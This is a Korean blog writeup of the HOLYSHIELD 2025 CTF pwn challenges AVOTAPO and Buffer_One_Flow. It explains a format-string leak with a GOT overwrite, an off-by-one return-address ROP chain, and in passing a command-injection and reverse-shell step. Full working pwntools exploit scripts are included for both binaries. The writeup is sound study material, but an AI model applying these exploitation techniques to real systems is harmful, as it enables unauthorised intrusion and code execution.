---
title: "HOLYSHIELD 2025 Writeup"
description: "대학 후배가 학부생 마지막 CTF를 같이 해보자고 연락이 와 참여하게 되었다.그래서 그냥 놀려가야지~ 했는데 애들이 진심이길래 나도 간만에 집중하면서 참여했었는데....의도치 않게 버스 타버린 신세가 되어버렸다.. PWN 분야 문제는 총 3문제가 있었는데 유형만 정리하면 v8, rop, tapo 1-day 재현? 한 문제"
date: "2025-12-28"
translation_key: "tistory-a9f7e62c938c"
tags: ["Write Up/CTF"]
category: "Write Up/CTF"
source_url: "https://whrdud727.tistory.com/entry/HOLYSHIELD-2025-Writeup"
private: false
---

대학 후배가 학부생 마지막 CTF를 같이 해보자고 연락이 와 참여하게 되었다.

그래서 그냥 놀려가야지~ 했는데 애들이 진심이길래 나도 간만에 집중하면서 참여했었는데....

의도치 않게 버스 타버린 신세가 되어버렸다..

* * *

PWN 분야 문제는 총 3문제가 있었는데 유형만 정리하면 v8, rop, tapo 1-day 재현? 한 문제들이었다.

아침 09:00부터 18:00였던가 대회가 진행되었는데 이 시간동안 한 문제에만 매달렸다.

나만 그런게 아니라 대회에 참여한 내 지인들도 모두 이 문제를 잡느라 다른 문제를 못봤다고 한다.

가장 많이 푼 사람이 1문제인가 푼 사람인데 그것도 딱 한명이었다는..

* * *

### AVOTAPO

![](/assets/images/tistory/tistory-a9f7e62c938c/001.png)

나를 비룻한 대회에 참여한 대부분의 포너들이 잡고 있던 문제....

첨부된 파일을 다운 받아보면 2개의 경로가 존재하는 것을 볼 수 있다.

camera 경로에는 웹 페이지를 구축하는 파일들이 들어있는데 제공된 ip, port가 웹은 아니었기에 chall 경로의 파일을 먼저 봐야 한다.

![](/assets/images/tistory/tistory-a9f7e62c938c/002.png)

바이너리가 실행되면 사용자로부터 ID 값을 입력받는다.

이때 입력받은 값이 'happysmile' 문자열인지를 검사한다. 이때 이 문자열 뒤로 다른 문자열이 오는지에 대해서는 검증이 존재하지 않는다.

문자열 검증 이후에는 fsb 취약점이 발생한다.

![](/assets/images/tistory/tistory-a9f7e62c938c/003.png)

administrator()에서는 switch문을 통해 이후 동작이 결정된다. 이때 2가 들어오면 pwn()을 실행시킬 수 있다.

![](/assets/images/tistory/tistory-a9f7e62c938c/004.png)

pwn()에서는 ck값에 따라 1 byte 만 덮어쓸 건지 아니면 8 byte를 덮어쓸 건지를 결정할 수 있다.

여기서 한번의 작업을 수행한 이후 ck 값이 변경되지만 이후 바로 종료가 되어버리기 때문에 해당 함수를 2번 이상 반복시켜야 한다.

먼저 첫 번째 취약점인 fsb를 이용하여 canary, pie, libc, stack 모두 구해줘야 한다.

이후 pwn()으로 와서 stack ret의 1byte 변조시켜 다시 돌려야 한다.

이후 8 byte overwrite를 이용해서 puts@got를 got overwrite 해주면 된다.

```
from pwn import *

target = b'./prob'

p = process(target)
p = remote("<target_ip>",<port>)
#p = remote('127.0.0.1',9000)
e = ELF(b'./libc.so.6')

passkey = b"happysmile "
passkey += b"%15$p "
passkey += b"%20$p "
passkey += b"%23$p "
passkey += b"%1$p "

p.sendlineafter(b"ID : ",passkey)
p.recvuntil(b"0x")

cny = int(p.recvn(16),16)
print("cny = ",hex(cny))

p.recvuntil(b"0x")
pie_base = int(p.recvn(12),16) - 0x33b0
print("pie_base = ",hex(pie_base))

p.recvuntil(b"0x")
libc_base = int(p.recvn(12),16) - 0x29d90
print("libc_base = ",hex(libc_base))

p.recvuntil(b"0x")
stack = int(p.recvn(12),16) +0x20f8 #- 0x28 #0x3a1
print("stack_addr =", hex(stack))

p.sendlineafter(b">> ",b"2")

puts_got = pie_base + 0x35c8 #e.got['puts']
print("puts_got = ",hex(puts_got))

p.recvuntil("pwn pwn!")

p.sendline(str(stack).encode())
p.sendline(str(0x30).encode())

p.sendlineafter(b">> ",b"2")

p.recvuntil("pwn pwn!")
p.sendline(str(puts_got).encode())
p.sendline(str(libc_base + 0xebc85).encode())

p.interactive()
```

이렇게 첫 번째 바이너리에서 셸을 획득하고 나서 내부 로그 파일을 봐야 한다.

여기에 특정 IP를 포함하여 ffmpeg인가 힌트가 있었는데 이거 보고 설마 flag를 미디어로 뽑아야 하나 하고 해보진 않았다.. 해볼걸...

이후 풀이 방법만 정리하면 여기서 구한 IP는 웹 서버이며 여기서는 command injection 취약점이 존재한다. 여기서 리버스 셸을 트리거 하고... ffmpeg를 통해 영상 뽑으면 끝인건데... 진짜 이거였다니...

* * *

### Buffer\_One\_Flow

이 문제는 대회 기간에는 시간 관계상 못 풀었지만 대회 끝난 이후에 풀어보았다.

관련해서 대회 Discord와 git에 풀이자 코드와 공식 writeup이 하나씩 올라왔지만 내 환경에서는 안풀린다??

Docker까지 구축해서 돌렸는데 안되길래 그냥 새로 풀었다.

문제 코드는 진짜 간단하다.

![](/assets/images/tistory/tistory-a9f7e62c938c/005.png)

이 코드가 그냥 핵심코드이며 바이너리의 전체라고 보면 된다.

16 byte 만큼 버퍼를 할당하고 여기에 0x8 만큼 sfp 생각하면 0x24 즉 0x18이 sfp 까지이다. 이후 ret를 딱 1 byte만 덮어쓸 수 있다.

![](/assets/images/tistory/tistory-a9f7e62c938c/006.png)

1 byte만 덮어쓰는 걸로 무엇을 할 수 있냐 하겠지만 할 수 있는건 생각보다 많다.

취약 함수인 vuln()부터 main()까지 다 1 byte 만 변조해도 접근이 가능하다.

여기서 셸을 획득하기 위해서는 일단 구해줘야 할 것이 너무 많다.

![](/assets/images/tistory/tistory-a9f7e62c938c/007.png)

NX-Bit와 PIE가 활성화 되어 있으며 got overwrite가 불가하다.

때문에 libc, pie, stack 모두 구해줘야 한다.

![](/assets/images/tistory/tistory-a9f7e62c938c/008.png)

0x19 byte를 입력할 때 1 byte를 조작하여 ret를 이제 main()이나 다른 함수의 시작 주소로 바꿔주면 된다.

저렇게 0x19 byte 입력하면은 off-by-one으로 인해 ret까지 출력되게 된다.

그러면 자연스레 pie\_base를 구할 수 있다.

이후에 이제 stack이 생성되는 것을 사용해서 반복해서 \_start(), main(), vuln() 중 하나로 0x18 만큼 채우고, 1 byte까지 덮어쓴느 것을 몇차례 보내면 메모리상에 보기 좋은 구조를 하나 볼 수 있다.

libc 구간 주소

dummy#1

dummy#2

pie 구간 주소

이 구간을 이용해서 dummy#2로 sfp를 조작할 수 있게 되면 rbp+0x10 (stack은 높은 숫자에서 낮은 숫자로 자랍니다!) 부터 출력되는 vuln()으로부터 libc를 구할 수 있다.

![](/assets/images/tistory/tistory-a9f7e62c938c/009.png)

이를 위해서는 stack 주소를 구해야 한다. stack 주소를 출력 시키면서 동시에 main(), vuln(), \_start() 중 하나로 ret 시켜야 한다.

이 부분은 앞서 반복해서 데이터를 보내던 구간에서 스택이 아래와 같이 만들어졌는데 이 부분을 이용하면 된다.

![](/assets/images/tistory/tistory-a9f7e62c938c/010.png)

구할 거 다 구했으면 이제 ROP chain 구성해서 셸을 획득하면 끝이다.

```
from pwn import*

target = b'./chall'

p = process(target)
e = ELF(target)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

#context.log_level='debug'

payload = b'a'*0x18
payload += b'\x9a'

################## pie base leak ###############
p.send(payload)

p.recvuntil(b'a'*0x18)
pie_base = u64(p.recvn(6)+b'\x00\x00') - 0x000000000000119a

print("pie_base = ", hex(pie_base))

################## stack addr leak  #############
payload = p64(pie_base + 0x4110)
payload += p64(pie_base + 0x1080)*0x2
payload += b'\x9a'

for i in range(10):
    p.send(payload)

payload = p64(pie_base+0x1080)*0x3
payload += b'\x9a'
for i in range(10):
    p.send(payload)
payload = b'c'*0x10
pause()
p.send(payload)

p.recvuntil(b'c'*0x10)
stack = u64(p.recvn(6) + b'\x00'*2)
print("stack_addr = ", hex(stack))

################### libc base leak  ##############

payload = p64(pie_base + e.sym['main'])*2
payload += p64(stack-0xe8)
payload += b'\x8b'
p.send(payload)

p.recvn(8)
libc_base = u64(p.recvn(6)+b'\x00'*2) - 0x202030
print("libc_base = ",hex(libc_base))

#################################################

system = libc_base + libc.sym['system']
binsh = libc_base + list(libc.search("/bin/sh\x00"))[0]
p_rdi = libc_base + 0x000000000010f78b

print("system_addr = ",hex(system))
print("binsh_addr = ",hex(binsh))
print("p_rdi_adr = ",hex(p_rdi))

payload = b'a'*0x10
payload += p64(system)
payload += b'\x9a'
p.send(payload)

payload = b'b'*0x10
payload += p64(binsh)
payload += b'\x9a'
p.send(payload)

payload = b'c'*0x10
payload += p64(p_rdi)
payload += b'\x9a'
p.send(payload)

payload = b'd'*0x18
payload += p64(pie_base + 0x11b2)
p.send(payload)

p.interactive()
```

흠.. 공식 롸업이랑은 더 간단했는데 내 환경에서는 안되니... 이런 방법으로...
